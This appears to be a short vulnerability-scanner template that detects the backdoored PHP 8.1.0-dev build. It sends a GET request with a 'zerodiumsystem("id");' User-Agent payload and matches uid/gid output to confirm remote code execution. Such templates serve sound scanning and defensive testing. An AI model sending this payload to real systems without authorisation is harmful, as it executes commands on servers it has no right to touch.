id: PHP-Version-leads-to-RCE

info:
  name: PHP 8.1.0-dev
  author: 25
  severity: high
  tags: rce

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    headers:
      User-Agent: 'zerodiumsystem("id");'

    matchers:
    - type: regex
      regex:
        - 'uid=[0-9a-zA-Z_()-. ]+gid=[0-9a-zA-Z_()-. ]+'
      part: body
